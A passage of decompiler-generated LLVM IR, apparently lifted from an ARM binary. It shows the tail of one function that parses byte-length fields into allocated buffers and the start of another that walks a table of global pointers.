  store i32 %v0_a0e8, i32* @r4, align 4
  %tmp33 = icmp ult i32 %arg2, 4
  br i1 %tmp33, label %dec_label_pc_a0fc, label %dec_label_pc_a0f0

dec_label_pc_a0f0:                                ; preds = %dec_label_pc_a0d8
  %v7_a0f0 = icmp eq i32 %arg2, 4
  store i1 %v7_a0f0, i1* %cpsr_z.global-to-local, align 1
  %v1_a0f4 = inttoptr i32 %v0_a0e8 to i32*
  %v2_a0f4 = load i32, i32* %v1_a0f4, align 4
  store i32 %v2_a0f4, i32* @sl, align 4
  br i1 %v7_a0f0, label %dec_label_pc_a0fc, label %dec_label_pc_a104

dec_label_pc_a0fc:                                ; preds = %dec_label_pc_a120, %.dec_label_pc_a0fc_crit_edge, %dec_label_pc_a0f0, %dec_label_pc_a114, %dec_label_pc_a104, %dec_label_pc_a0d8
  %v29_a100 = phi i32 [ %v29_a100.pre, %.dec_label_pc_a0fc_crit_edge ], [ %v0_a0e8, %dec_label_pc_a120 ], [ %v0_a0e8, %dec_label_pc_a0f0 ], [ %v0_a0e8, %dec_label_pc_a114 ], [ %v0_a0e8, %dec_label_pc_a104 ], [ %v0_a0e8, %dec_label_pc_a0d8 ]
  store i32 %v9_a0d8, i32* @r6, align 4
  store i32 %v12_a0d8, i32* @r7, align 4
  store i32 %v18_a0d8, i32* @sb, align 4
  store i32 %v21_a0d8, i32* @sl, align 4
  ret i32 %v29_a100

dec_label_pc_a104:                                ; preds = %dec_label_pc_a0f0
  %v7_a104 = icmp eq i32 %arg2, 5
  store i1 %v7_a104, i1* %cpsr_z.global-to-local, align 1
  %v1_a108 = add i32 %v0_a0e8, 4
  %v2_a108 = inttoptr i32 %v1_a108 to i8*
  %v3_a108 = load i8, i8* %v2_a108, align 1
  %v4_a108 = zext i8 %v3_a108 to i32
  store i32 %v4_a108, i32* %r1.global-to-local, align 4
  br i1 %v7_a104, label %dec_label_pc_a0fc, label %dec_label_pc_a114

dec_label_pc_a114:                                ; preds = %dec_label_pc_a104
  %v1_a114 = add i32 %v0_a0e8, 5
  %v2_a114 = inttoptr i32 %v1_a114 to i8*
  %v3_a114 = load i8, i8* %v2_a114, align 1
  %v4_a114 = zext i8 %v3_a114 to i32
  store i32 %v4_a114, i32* @r7, align 4
  %v2_a118 = icmp eq i8 %v3_a114, 0
  store i1 %v2_a118, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a118, label %dec_label_pc_a0fc, label %dec_label_pc_a120

dec_label_pc_a120:                                ; preds = %dec_label_pc_a114
  %v3_a120 = mul nuw nsw i32 %v4_a114, 4
  store i32 %v3_a120, i32* @sb, align 4
  %v1_a124 = add i32 %arg2, -6
  store i32 %v1_a124, i32* @r6, align 4
  %v2_a128 = mul nuw nsw i32 %v4_a114, 5
  store i32 %v2_a128, i32* @r8, align 4
  %v3_a12c = icmp ult i32 %v1_a124, %v2_a128
  %v9_a12c = icmp eq i32 %v1_a124, %v2_a128
  store i1 %v9_a12c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a12c, label %dec_label_pc_a0fc, label %dec_label_pc_a134

dec_label_pc_a134:                                ; preds = %dec_label_pc_a120
  store i32 %v4_a114, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  %v2_a13c = call i32 @function_14294(i32 %v4_a114, i32 24)
  store i32 %v2_a13c, i32* %r0.global-to-local, align 4
  %v0_a140 = load i32, i32* @r7, align 4
  %v2_a140 = icmp eq i32 %v0_a140, 0
  store i1 %v2_a140, i1* %cpsr_z.global-to-local, align 1
  %v0_a148 = load i32, i32* @r4, align 4
  %v1_a148 = add i32 %v0_a148, 6
  store i32 %v1_a148, i32* %fp.global-to-local, align 4
  %tmp27 = icmp slt i32 %v0_a140, 1
  br i1 %tmp27, label %dec_label_pc_a1a0thread-pre-split, label %dec_label_pc_a150

dec_label_pc_a150:                                ; preds = %dec_label_pc_a134
  store i32 %v2_a13c, i32* %r1.global-to-local, align 4
  %v1_a154 = load i32, i32* @r8, align 4
  %v2_a154 = add i32 %v1_a154, %v0_a148
  store i32 %v2_a154, i32* %ip.global-to-local, align 4
  store i32 %v0_a148, i32* %r0.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_a164

dec_label_pc_a164:                                ; preds = %dec_label_pc_a164.dec_label_pc_a164_crit_edge, %dec_label_pc_a150
  %v2_a174 = phi i32 [ %v1_a188, %dec_label_pc_a164.dec_label_pc_a164_crit_edge ], [ %v2_a13c, %dec_label_pc_a150 ]
  %v0_a170 = phi i32 [ %v0_a170.pre, %dec_label_pc_a164.dec_label_pc_a164_crit_edge ], [ %v2_a154, %dec_label_pc_a150 ]
  %v0_a16c = phi i32 [ %v0_a164.pre, %dec_label_pc_a164.dec_label_pc_a164_crit_edge ], [ %v0_a148, %dec_label_pc_a150 ]
  %v1_a164 = add i32 %v0_a16c, 10
  %v2_a164 = inttoptr i32 %v1_a164 to i8*
  %v3_a164 = load i8, i8* %v2_a164, align 1
  %v1_a168 = add i32 %v0_a16c, 6
  %v2_a168 = inttoptr i32 %v1_a168 to i32*
  %v3_a168 = load i32, i32* %v2_a168, align 4
  store i32 %v3_a168, i32* %r2.global-to-local, align 4
  %v1_a16c = add i32 %v0_a16c, 5
  store i32 %v1_a16c, i32* %r0.global-to-local, align 4
  %v9_a170 = icmp eq i32 %v0_a170, %v1_a16c
  store i1 %v9_a170, i1* %cpsr_z.global-to-local, align 1
  %v3_a174 = add i32 %v2_a174, 20
  %v4_a174 = inttoptr i32 %v3_a174 to i8*
  store i8 %v3_a164, i8* %v4_a174, align 1
  %v0_a178 = load i32, i32* %r2.global-to-local, align 4
  %v1_a178 = load i32, i32* %r1.global-to-local, align 4
  %v2_a178 = add i32 %v1_a178, 4
  %v3_a178 = inttoptr i32 %v2_a178 to i32*
  store i32 %v0_a178, i32* %v3_a178, align 4
  %v0_a17c = load i32, i32* %r2.global-to-local, align 4
  %v1_a17c = load i32, i32* %r1.global-to-local, align 4
  %v2_a17c = add i32 %v1_a17c, 16
  %v3_a17c = inttoptr i32 %v2_a17c to i32*
  store i32 %v0_a17c, i32* %v3_a17c, align 4
  %v0_a180 = load i32, i32* @r4, align 4
  %v1_a180 = trunc i32 %v0_a180 to i8
  %v2_a180 = load i32, i32* %r1.global-to-local, align 4
  %v3_a180 = inttoptr i32 %v2_a180 to i8*
  store i8 %v1_a180, i8* %v3_a180, align 1
  %v0_a184 = load i32, i32* @lr, align 4
  %v1_a184 = trunc i32 %v0_a184 to i8
  %v2_a184 = load i32, i32* %r1.global-to-local, align 4
  %v3_a184 = add i32 %v2_a184, 1
  %v4_a184 = inttoptr i32 %v3_a184 to i8*
  store i8 %v1_a184, i8* %v4_a184, align 1
  %v0_a188 = load i32, i32* %r1.global-to-local, align 4
  %v1_a188 = add i32 %v0_a188, 24
  store i32 %v1_a188, i32* %r1.global-to-local, align 4
  %v0_a18c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a18c, label %dec_label_pc_a190, label %dec_label_pc_a164.dec_label_pc_a164_crit_edge

dec_label_pc_a164.dec_label_pc_a164_crit_edge:    ; preds = %dec_label_pc_a164
  %v0_a164.pre = load i32, i32* %r0.global-to-local, align 4
  %v0_a170.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a164

dec_label_pc_a190:                                ; preds = %dec_label_pc_a164
  %v0_a190 = load i32, i32* @sb, align 4
  %v1_a190 = load i32, i32* @r7, align 4
  %v1_a194 = load i32, i32* @r5, align 4
  %sum = add i32 %v1_a190, %v0_a190
  %v2_a194 = sub i32 %v1_a194, %sum
  %v0_a198 = load i32, i32* %r0.global-to-local, align 4
  %v1_a198 = add i32 %v0_a198, 6
  store i32 %v1_a198, i32* %fp.global-to-local, align 4
  %v1_a19c = add i32 %v2_a194, -6
  store i32 %v1_a19c, i32* @r6, align 4
  br label %dec_label_pc_a1a0

dec_label_pc_a1a0thread-pre-split:                ; preds = %dec_label_pc_a134
  %v0_a1a0.pr = load i32, i32* @r6, align 4
  br label %dec_label_pc_a1a0

dec_label_pc_a1a0:                                ; preds = %dec_label_pc_a1a0thread-pre-split, %dec_label_pc_a190
  %v0_a1ac = phi i32 [ %v1_a148, %dec_label_pc_a1a0thread-pre-split ], [ %v1_a198, %dec_label_pc_a190 ]
  %v1_a1a4 = phi i32 [ %v0_a1a0.pr, %dec_label_pc_a1a0thread-pre-split ], [ %v1_a19c, %dec_label_pc_a190 ]
  %v2_a1a0 = icmp eq i32 %v1_a1a4, 0
  store i1 %v2_a1a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a1a0, label %dec_label_pc_a2d8, label %dec_label_pc_a1ac

dec_label_pc_a1ac:                                ; preds = %dec_label_pc_a1a0
  %v1_a1ac = inttoptr i32 %v0_a1ac to i8*
  %v2_a1ac = load i8, i8* %v1_a1ac, align 1
  %v3_a1ac = zext i8 %v2_a1ac to i32
  store i32 %v3_a1ac, i32* @sb, align 4
  %v2_a1b0 = icmp eq i8 %v2_a1ac, 0
  store i1 %v2_a1b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a1b0, label %dec_label_pc_a290, label %dec_label_pc_a1c0

dec_label_pc_a1c0:                                ; preds = %dec_label_pc_a1ac
  store i32 %v3_a1ac, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_a1c8 = call i32 @function_14294(i32 %v3_a1ac, i32 8)
  store i32 %v2_a1c8, i32* %r0.global-to-local, align 4
  %v0_a1cc = load i32, i32* @sb, align 4
  %v2_a1cc = icmp eq i32 %v0_a1cc, 0
  store i1 %v2_a1cc, i1* %cpsr_z.global-to-local, align 1
  %tmp28 = icmp slt i32 %v0_a1cc, 1
  br i1 %tmp28, label %dec_label_pc_a290, label %dec_label_pc_a1dc

dec_label_pc_a1dc:                                ; preds = %dec_label_pc_a1c0
  %v0_a1dc = load i32, i32* @r6, align 4
  %v1_a1dc = add i32 %v0_a1dc, -1
  store i32 %v1_a1dc, i32* %r2.global-to-local, align 4
  %v7_a1dc = icmp eq i32 %v0_a1dc, 1
  store i1 %v7_a1dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a1dc, label %dec_label_pc_a2d8, label %dec_label_pc_a1e4

dec_label_pc_a1e4:                                ; preds = %dec_label_pc_a1dc
  %v0_a1e4 = load i32, i32* %fp.global-to-local, align 4
  %v1_a1e4 = add i32 %v0_a1e4, 1
  %v2_a1e4 = inttoptr i32 %v1_a1e4 to i8*
  %v3_a1e4 = load i8, i8* %v2_a1e4, align 1
  %v1_a1e8 = add i32 %v0_a1dc, -2
  store i32 %v1_a1e8, i32* %r2.global-to-local, align 4
  %v7_a1e8 = icmp eq i32 %v1_a1dc, 1
  store i1 %v7_a1e8, i1* %cpsr_z.global-to-local, align 1
  %v3_a1ec = add i32 %v2_a1c8, 4
  %v4_a1ec = inttoptr i32 %v3_a1ec to i8*
  store i8 %v3_a1e4, i8* %v4_a1ec, align 1
  %v0_a1f0 = load i32, i32* %fp.global-to-local, align 4
  %v1_a1f0 = add i32 %v0_a1f0, 1
  store i32 %v1_a1f0, i32* %r0.global-to-local, align 4
  %v0_a1f4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a1f4, label %dec_label_pc_a2d8, label %dec_label_pc_a1f8

dec_label_pc_a1f8:                                ; preds = %dec_label_pc_a1e4
  %v1_a1f8 = add i32 %v0_a1f0, 2
  %v2_a1f8 = inttoptr i32 %v1_a1f8 to i8*
  %v3_a1f8 = load i8, i8* %v2_a1f8, align 1
  %v4_a1f8 = zext i8 %v3_a1f8 to i32
  store i32 %v4_a1f8, i32* @r4, align 4
  %v0_a1fc = load i32, i32* %r2.global-to-local, align 4
  %v1_a1fc = add i32 %v0_a1fc, -1
  store i32 %v1_a1fc, i32* @r8, align 4
  %v9_a200 = icmp eq i32 %v1_a1fc, %v4_a1f8
  store i1 %v9_a200, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a1f8, i32* %r0.global-to-local, align 4
  %v5_a208 = icmp slt i32 %v1_a1fc, %v4_a1f8
  br i1 %v5_a208, label %dec_label_pc_a2d8, label %dec_label_pc_a20c

dec_label_pc_a20c:                                ; preds = %dec_label_pc_a1f8
  store i32 %v2_a1c8, i32* @r5, align 4
  %v1_a214 = add i32 %v2_a1c8, 8
  %v1_a218 = add i32 %v0_a1f0, 3
  store i32 %v1_a218, i32* @r6, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_a25c

dec_label_pc_a228:                                ; preds = %dec_label_pc_a25c
  %v0_a228 = load i32, i32* @r8, align 4
  %v1_a228 = load i32, i32* @r4, align 4
  %v2_a228 = sub i32 %v0_a228, %v1_a228
  store i32 %v2_a228, i32* %r2.global-to-local, align 4
  %v9_a228 = icmp eq i32 %v0_a228, %v1_a228
  store i1 %v9_a228, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a228, label %dec_label_pc_a2d8, label %dec_label_pc_a230

dec_label_pc_a230:                                ; preds = %dec_label_pc_a228
  %v1_a230 = load i32, i32* @r6, align 4
  %v2_a230 = add i32 %v1_a230, %v1_a228
  %v3_a230 = inttoptr i32 %v2_a230 to i8*
  %v4_a230 = load i8, i8* %v3_a230, align 1
  store i32 %v2_a230, i32* %r0.global-to-local, align 4
  %v1_a238 = add i32 %v2_a228, -1
  store i32 %v1_a238, i32* %r2.global-to-local, align 4
  %v7_a238 = icmp eq i32 %v2_a228, 1
  store i1 %v7_a238, i1* %cpsr_z.global-to-local, align 1
  %v3_a23c = add i32 %v2_a23c, 4
  %v4_a23c = inttoptr i32 %v3_a23c to i8*
  store i8 %v4_a230, i8* %v4_a23c, align 1
  %v0_a240 = load i32, i32* %r0.global-to-local, align 4
  %v0_a244 = load i32, i32* %r2.global-to-local, align 4
  %v1_a244 = add i32 %v0_a244, -1
  store i32 %v1_a244, i32* @r8, align 4
  %v1_a248 = add i32 %v0_a240, 2
  store i32 %v1_a248, i32* @r6, align 4
  %v0_a24c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a24c, label %dec_label_pc_a2d8, label %dec_label_pc_a250

dec_label_pc_a250:                                ; preds = %dec_label_pc_a230
  %v1_a240 = add i32 %v0_a240, 1
  %v2_a250 = inttoptr i32 %v1_a240 to i8*
  %v3_a250 = load i8, i8* %v2_a250, align 1
  %v4_a250 = zext i8 %v3_a250 to i32
  store i32 %v4_a250, i32* @r4, align 4
  %v2_a254 = sub i32 %v1_a244, %v4_a250
  %tmp30 = sub i32 0, %v2_a254
  %v6_a254 = and i32 %v1_a244, %tmp30
  %v7_a254 = icmp slt i32 %v6_a254, 0
  %v8_a254 = icmp slt i32 %v2_a254, 0
  %v9_a254 = icmp eq i32 %v1_a244, %v4_a250
  store i1 %v9_a254, i1* %cpsr_z.global-to-local, align 1
  %v2_a258 = xor i1 %v8_a254, %v7_a254
  br i1 %v2_a258, label %dec_label_pc_a2d8, label %dec_label_pc_a25c

dec_label_pc_a25c:                                ; preds = %dec_label_pc_a250, %dec_label_pc_a20c
  %v0_a260 = phi i32 [ %v4_a1f8, %dec_label_pc_a20c ], [ %v4_a250, %dec_label_pc_a250 ]
  %v2_a23c = phi i32 [ %v1_a214, %dec_label_pc_a20c ], [ %v1_a280, %dec_label_pc_a250 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_a260 = add nuw nsw i32 %v0_a260, 1
  store i32 %v1_a260, i32* %r0.global-to-local, align 4
  %v2_a264 = call i32 @function_14294(i32 %v1_a260, i32 1)
  store i32 %v2_a264, i32* %r0.global-to-local, align 4
  %v0_a268 = load i32, i32* @r6, align 4
  store i32 %v0_a268, i32* %r1.global-to-local, align 4
  %v1_a26c = load i32, i32* @r5, align 4
  %v2_a26c = inttoptr i32 %v1_a26c to i32*
  store i32 %v2_a264, i32* %v2_a26c, align 4
  %v0_a270 = load i32, i32* @r4, align 4
  store i32 %v0_a270, i32* %r2.global-to-local, align 4
  %v3_a274 = call i32 @function_12d58(i32 %v2_a264, i32 %v0_a268, i32 %v0_a270)
  store i32 %v3_a274, i32* %r0.global-to-local, align 4
  store i32 %v2_a23c, i32* @r5, align 4
  %v0_a27c = load i32, i32* %fp.global-to-local, align 4
  %v1_a27c = add i32 %v0_a27c, 1
  store i32 %v1_a27c, i32* %fp.global-to-local, align 4
  %v1_a280 = add i32 %v2_a23c, 8
  store i32 %v1_a280, i32* %ip.global-to-local, align 4
  %v1_a284 = load i32, i32* @sb, align 4
  %v9_a284 = icmp eq i32 %v1_a27c, %v1_a284
  store i1 %v9_a284, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a284, label %dec_label_pc_a290, label %dec_label_pc_a228

dec_label_pc_a290:                                ; preds = %dec_label_pc_a25c, %dec_label_pc_a1c0, %dec_label_pc_a1ac
  %stack_var_-48.1 = phi i32 [ %v3_a1ac, %dec_label_pc_a1ac ], [ %v0_a1cc, %dec_label_pc_a1c0 ], [ %v0_a1cc, %dec_label_pc_a25c ]
  %stack_var_-52.2 = phi i32 [ %v3_a1ac, %dec_label_pc_a1ac ], [ %v2_a1c8, %dec_label_pc_a1c0 ], [ %v2_a1c8, %dec_label_pc_a25c ]
  %v0_a290 = call i32 @function_13c70()
  %v0_a294 = load i32, i32* @sl, align 4
  %v1_a294 = and i32 %v0_a294, ptrtoint (i32* @global_var_ff00.24 to i32)
  store i32 %stack_var_-48.1, i32* %ip.global-to-local, align 4
  %v3_a2a0 = mul i32 %v0_a294, 16777216
  %v4_a2a4 = mul i32 %v1_a294, 256
  %v5_a2a4 = or i32 %v4_a2a4, %v3_a2a0
  store i32 %v5_a2a4, i32* %r1.global-to-local, align 4
  %v1_a29c = udiv i32 %v0_a294, 256
  %v3_a2a8 = and i32 %v1_a29c, 65280
  store i32 %v3_a2a8, i32* %r2.global-to-local, align 4
  %v2_a2b0 = inttoptr i32 %v0_a290 to i32*
  store i32 0, i32* %v2_a2b0, align 4
  %v0_a2b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_a2b4 = load i32, i32* @sl, align 4
  %v4_a2b4 = udiv i32 %v1_a2b4, 16777216
  %v5_a2b4 = or i32 %v4_a2b4, %v0_a2b4
  %v0_a2b8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %stack_var_-52.2, i32* @ip, align 4
  %v1_a2c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_a2c0 = or i32 %v5_a2b4, %v1_a2c0
  store i32 %v2_a2c0, i32* %r0.global-to-local, align 4
  store i32 %v4_a108, i32* %r1.global-to-local, align 4
  %v0_a2cc = load i32, i32* @r7, align 4
  store i32 %v0_a2cc, i32* %r2.global-to-local, align 4
  %v6_a2d4 = trunc i32 %v0_a2b8 to i8
  %v7_a2d4 = call i32 @function_9fe8(i32 %v2_a2c0, i32 %v4_a108, i32 %v0_a2cc, i32 %v2_a13c, i8 %v6_a2d4, i32 %stack_var_-52.2)
  store i32 %v7_a2d4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a2d8

dec_label_pc_a2d8:                                ; preds = %dec_label_pc_a250, %dec_label_pc_a230, %dec_label_pc_a228, %dec_label_pc_a1f8, %dec_label_pc_a1e4, %dec_label_pc_a1dc, %dec_label_pc_a1a0, %dec_label_pc_a290
  %stack_var_-52.3 = phi i32 [ 0, %dec_label_pc_a1a0 ], [ %stack_var_-52.2, %dec_label_pc_a290 ], [ %v2_a1c8, %dec_label_pc_a1dc ], [ %v2_a1c8, %dec_label_pc_a1e4 ], [ %v2_a1c8, %dec_label_pc_a1f8 ], [ %v2_a1c8, %dec_label_pc_a228 ], [ %v2_a1c8, %dec_label_pc_a230 ], [ %v2_a1c8, %dec_label_pc_a250 ]
  store i32 %v2_a13c, i32* %r1.global-to-local, align 4
  %v2_a2dc = icmp eq i32 %v2_a13c, 0
  store i1 %v2_a2dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a2dc, label %bb31, label %bb

bb:                                               ; preds = %dec_label_pc_a2d8
  store i32 %v2_a13c, i32* %r0.global-to-local, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_a2d8, %bb
  %v1_a2e4 = xor i1 %v2_a2dc, true
  call void @__pseudo_cond_branch(i1 %v1_a2e4, i32 ptrtoint (i32* @global_var_142ec.59 to i32))
  %v2_a2ec = icmp eq i32 %stack_var_-52.3, 0
  store i1 %v2_a2ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a2ec, label %.dec_label_pc_a0fc_crit_edge, label %dec_label_pc_a2f4

.dec_label_pc_a0fc_crit_edge:                     ; preds = %bb31
  %v29_a100.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a0fc

dec_label_pc_a2f4:                                ; preds = %bb31
  %v0_a2f4 = load i32, i32* @sb, align 4
  %v2_a2f4 = icmp eq i32 %v0_a2f4, 0
  store i1 %v2_a2f4, i1* %cpsr_z.global-to-local, align 1
  %tmp32 = icmp slt i32 %v0_a2f4, 1
  br i1 %tmp32, label %dec_label_pc_a31c, label %dec_label_pc_a2fc

dec_label_pc_a2fc:                                ; preds = %dec_label_pc_a2f4
  br label %dec_label_pc_a300

dec_label_pc_a300:                                ; preds = %dec_label_pc_a300, %dec_label_pc_a2fc
  %v0_a30c = phi i32 [ %v1_a30c, %dec_label_pc_a300 ], [ 0, %dec_label_pc_a2fc ]
  store i32 %stack_var_-52.3, i32* %ip.global-to-local, align 4
  %v4_a304 = mul i32 %v0_a30c, 8
  %v5_a304 = add i32 %v4_a304, %stack_var_-52.3
  %v6_a304 = inttoptr i32 %v5_a304 to i32*
  %v7_a304 = load i32, i32* %v6_a304, align 4
  store i32 %v7_a304, i32* %r0.global-to-local, align 4
  %v2_a308 = icmp eq i32 %v7_a304, 0
  store i1 %v2_a308, i1* %cpsr_z.global-to-local, align 1
  %v1_a30c = add i32 %v0_a30c, 1
  %v1_a310 = xor i1 %v2_a308, true
  call void @__pseudo_cond_branch(i1 %v1_a310, i32 ptrtoint (i32* @global_var_142ec.59 to i32))
  %v0_a314 = load i32, i32* @sb, align 4
  %v9_a314 = icmp eq i32 %v0_a314, %v1_a30c
  store i1 %v9_a314, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a314, label %dec_label_pc_a31c, label %dec_label_pc_a300

dec_label_pc_a31c:                                ; preds = %dec_label_pc_a300, %dec_label_pc_a2f4
  store i32 %stack_var_-52.3, i32* @r0, align 4
  store i32 %v3_a0d8, i32* @r4, align 4
  store i32 %v6_a0d8, i32* @r5, align 4
  store i32 %v9_a0d8, i32* @r6, align 4
  store i32 %v12_a0d8, i32* @r7, align 4
  store i32 %v15_a0d8, i32* @r8, align 4
  store i32 %v18_a0d8, i32* @sb, align 4
  store i32 %v21_a0d8, i32* @sl, align 4
  store i32 %v27_a0d8, i32* @lr, align 4
  %v0_a328 = call i32 @function_142ec()
  store i32 %v0_a328, i32* %r0.global-to-local, align 4
  ret i32 %v0_a328

; uselistorder directives
  uselistorder i32 %stack_var_-52.3, { 2, 0, 1, 3 }
  uselistorder i32 %v0_a294, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.2, { 1, 0, 2 }
  uselistorder i32 %v1_a280, { 1, 0 }
  uselistorder i32 %v2_a23c, { 2, 1, 0 }
  uselistorder i32 %v2_a254, { 1, 0 }
  uselistorder i32 %v4_a250, { 0, 2, 1, 3 }
  uselistorder i32 %v1_a244, { 2, 0, 1, 3 }
  uselistorder i32 %v0_a240, { 1, 0 }
  uselistorder i32 %v0_a1dc, { 0, 2, 1 }
  uselistorder i32 %v0_a1cc, { 0, 2, 1, 3 }
  uselistorder i32 %v2_a1c8, { 0, 1, 2, 8, 7, 6, 3, 5, 9, 10, 4, 11 }
  uselistorder i32 %v3_a1ac, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_a188, { 1, 0 }
  uselistorder i32 %v0_a16c, { 0, 2, 1 }
  uselistorder i32 %v0_a148, { 1, 2, 0, 3 }
  uselistorder i32 %v2_a13c, { 0, 3, 4, 5, 1, 2, 6 }
  uselistorder i32 %v2_a128, { 2, 1, 0 }
  uselistorder i32 %v4_a114, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v4_a108, { 1, 0, 2 }
  uselistorder i32 %v0_a0e8, { 5, 6, 0, 1, 2, 3, 4, 7, 8 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 6, 3, 4, 5, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 21, 4, 22, 5, 8, 12, 9, 6, 7, 10, 11, 18, 13, 15, 14, 16, 17, 20, 19, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 4, 5, 3, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32 %arg2, { 1, 4, 5, 0, 2, 3, 6 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_a2d8, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_a0fc, { 1, 0, 3, 4, 2, 5 }
}

define i32 @function_a32c(i32 %arg1) local_unnamed_addr {
dec_label_pc_a32c:
  %r0.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_a32c = load i32, i32* @r4, align 4
  store i32 %v3_a32c, i32* %stack_var_-12, align 4
  %v6_a32c = load i32, i32* @r5, align 4
  %v9_a32c = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_1ec04.61 to i32), i32* @r4, align 4
  %v2_a334 = load i32, i32* @global_var_1ec04.61, align 4
  store i32 %v2_a334, i32* %r0.global-to-local, align 4
  %v2_a338 = icmp eq i32 %v2_a334, 0
  br i1 %v2_a338, label %dec_label_pc_a340, label %dec_label_pc_a3c0

dec_label_pc_a340:                                ; preds = %dec_label_pc_a32c
  %v3_a340 = load i32, i32* @global_var_1ec08.62, align 4
  store i32 %v3_a340, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v2_a348 = icmp eq i32 %v3_a340, 0
  store i32 0, i32* @global_var_1ec04.61, align 4
  br i1 %v2_a348, label %dec_label_pc_a354, label %dec_label_pc_a3dc

dec_label_pc_a354:                                ; preds = %dec_label_pc_a3c0.dec_label_pc_a354_crit_edge, %dec_label_pc_a340
  %v0_a35c = phi i32 [ %v0_a35c.pre, %dec_label_pc_a3c0.dec_label_pc_a354_crit_edge ], [ 0, %dec_label_pc_a340 ]
  %v1_a35c = phi i32 [ %v0_a354.pre, %dec_label_pc_a3c0.dec_label_pc_a354_crit_edge ], [ ptrtoint (i32* @global_var_1ec04.61 to i32), %dec_label_pc_a340 ]
  %v1_a354 = add i32 %v1_a35c, 8
  %v2_a354 = inttoptr i32 %v1_a354 to i32*
  %v3_a354 = load i32, i32* %v2_a354, align 4
  store i32 %v3_a354, i32* %r0.global-to-local, align 4
  %v2_a358 = icmp eq i32 %v3_a354, 0
  %v2_a35c = add i32 %v1_a35c, 4
  %v3_a35c = inttoptr i32 %v2_a35c to i32*
  store i32 %v0_a35c, i32* %v3_a35c, align 4
  br i1 %v2_a358, label %dec_label_pc_a364, label %dec_label_pc_a3f4

dec_label_pc_a364:                                ; preds = %dec_label_pc_a354, %dec_label_pc_a3dc
  %v0_a364 = load i32, i32* @r4, align 4
  %v1_a364 = add i32 %v0_a364, 12
  %v2_a364 = inttoptr i32 %v1_a364 to i32*
  %v3_a364 = load i32, i32* %v2_a364, align 4
  store i32 %v3_a364, i32* %r0.global-to-local, align 4
  %v2_a368 = icmp eq i32 %v3_a364, 0
  %v0_a36c = load i32, i32* %r5.global-to-local, align 4
  %v2_a36c = add i32 %v0_a364, 8
  %v3_a36c = inttoptr i32 %v2_a36c to i32*
  store i32 %v0_a36c, i32* %v3_a36c, align 4
  br i1 %v2_a368, label %dec_label_pc_a374, label %dec_label_pc_a40c

dec_label_pc_a374:                                ; preds = %dec_label_pc_a364, %dec_label_pc_a3f4
  %v0_a374 = load i32, i32* @r4, align 4
  %v1_a374 = add i32 %v0_a374, 16
  %v2_a374 = inttoptr i32 %v1_a374 to i32*
  %v3_a374 = load i32, i32* %v2_a374, align 4
  store i32 %v3_a374, i32* %r0.global-to-local, align 4
  %v2_a378 = icmp eq i32 %v3_a374, 0
  %v0_a37c = load i32, i32* %r5.global-to-local, align 4
  %v2_a37c = add i32 %v0_a374, 12
  %v3_a37c = inttoptr i32 %v2_a37c to i32*
  store i32 %v0_a37c, i32* %v3_a37c, align 4
  br i1 %v2_a378, label %dec_label_pc_a384, label %dec_label_pc_a424

dec_label_pc_a384:                                ; preds = %dec_label_pc_a374, %dec_label_pc_a40c
  %v0_a384 = load i32, i32* @r4, align 4
  %v1_a384 = add i32 %v0_a384, 20
  %v2_a384 = inttoptr i32 %v1_a384 to i32*
  %v3_a384 = load i32, i32* %v2_a384, align 4
  store i32 %v3_a384, i32* %r0.global-to-local, align 4
  %v2_a388 = icmp eq i32 %v3_a384, 0
  %v0_a38c = load i32, i32* %r5.global-to-local, align 4
  %v2_a38c = add i32 %v0_a384, 16
  %v3_a38c = inttoptr i32 %v2_a38c to i32*
  store i32 %v0_a38c, i32* %v3_a38c, align 4
  br i1 %v2_a388, label %dec_label_pc_a394, label %dec_label_pc_a43c

dec_label_pc_a394:                                ; preds = %dec_label_pc_a384, %dec_label_pc_a424
